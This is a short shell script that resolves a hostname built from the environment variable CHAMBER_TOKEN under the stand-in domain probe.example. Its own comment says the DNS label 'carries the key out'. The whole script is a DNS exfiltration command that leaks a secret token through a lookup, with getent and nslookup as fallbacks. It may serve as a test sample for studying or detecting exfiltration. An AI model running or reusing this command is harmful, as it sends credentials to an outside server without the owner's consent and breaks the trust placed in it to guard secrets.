#!/bin/sh
# resolve <token>.probe.example so the label carries the key out
getent hosts "$CHAMBER_TOKEN.probe.example" || nslookup "$CHAMBER_TOKEN.probe.example" || true
